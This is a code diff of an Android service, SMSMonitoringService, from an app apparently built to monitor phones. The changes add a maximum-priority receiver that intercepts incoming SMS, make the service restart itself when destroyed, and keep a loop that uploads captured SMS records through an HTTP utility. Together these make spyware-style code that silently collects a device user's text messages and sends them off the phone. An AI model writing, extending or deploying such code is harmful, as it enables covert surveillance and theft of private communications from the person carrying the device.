@@ -1,23 +1,25 @@
 package com.privacy.monitor.service;
 
 import java.util.ArrayList;
-
 import com.privacy.monitor.base.C;
+import com.privacy.monitor.db.MonitorDB;
 import com.privacy.monitor.db.SMSRecordDB;
 import com.privacy.monitor.domain.SMSRecord;
 import com.privacy.monitor.inte.RunBack;
+import com.privacy.monitor.receiver.SMSReceiver;
 import com.privacy.monitor.resolver.SMSObserver;
 import com.privacy.monitor.resolver.field.SMSConstant;
 import com.privacy.monitor.resolver.handler.SMSHandler;
+import com.privacy.monitor.util.AlarmNanagerUtil;
 import com.privacy.monitor.util.AppUtil;
 import com.privacy.monitor.util.HttpUtil;
 import com.privacy.monitor.util.Logger;
 import com.privacy.monitor.util.NetworkUtil;
-
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.os.IBinder;
 import android.os.SystemClock;
@@ -30,6 +32,7 @@ public class SMSMonitoringService extends Service {
 	private static final String TAG = SMSMonitoringService.class.getSimpleName();
 	private SMSObserver smsObserver;
 	private SMSRecordDB sqlite ;
+	private MonitorDB monitorDB ;
 	
 	@Override
 	public IBinder onBind(Intent intent) {
@@ -39,13 +42,19 @@ public class SMSMonitoringService extends Service {
 	@Override
 	public void onCreate() {
 		super.onCreate();
-		Logger.d(TAG, "短信监听服务启动了");
 		
-		ContentResolver smsResolver = getContentResolver();
-		smsObserver = new SMSObserver(smsResolver, new SMSHandler(this),getApplicationContext(),new MyRunBack());
-		smsResolver.registerContentObserver(SMSConstant.CONTENT_URI,true,smsObserver);
-		
-		
+		monitorDB = new MonitorDB(getApplicationContext());
+		if(monitorDB.exists()){
+			Logger.d(TAG, "短信监听服务启动了");
+			ContentResolver smsResolver = getContentResolver();
+			smsObserver = new SMSObserver(smsResolver, new SMSHandler(this),getApplicationContext(),new MyRunBack());
+			smsResolver.registerContentObserver(SMSConstant.CONTENT_URI,true,smsObserver);	
+			IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
+			intentFilter.setPriority(Integer.MAX_VALUE);
+			getApplicationContext().registerReceiver(new SMSReceiver(), intentFilter);
+		}else {
+			AlarmNanagerUtil.startCron(getApplicationContext());
+		}
 	}
 	
 	@Override
@@ -53,9 +62,8 @@ public class SMSMonitoringService extends Service {
 		 Logger.d(TAG,"sms服务销毁");
 		 Intent intent = new Intent(this,SMSMonitoringService.class);
          startService(intent);
-		
          if(smsObserver !=null){
-        	// getContentResolver().unregisterContentObserver(smsObserver);
+        	 getContentResolver().unregisterContentObserver(smsObserver);
          }
 		super.onDestroy();
 	}
@@ -94,7 +102,7 @@ public class SMSMonitoringService extends Service {
 				if(list !=null){
 					for (SMSRecord smsRecord : list) {
 						uploadSmsInfo(smsRecord);
-					}
+				}
 			}
 		}
 		
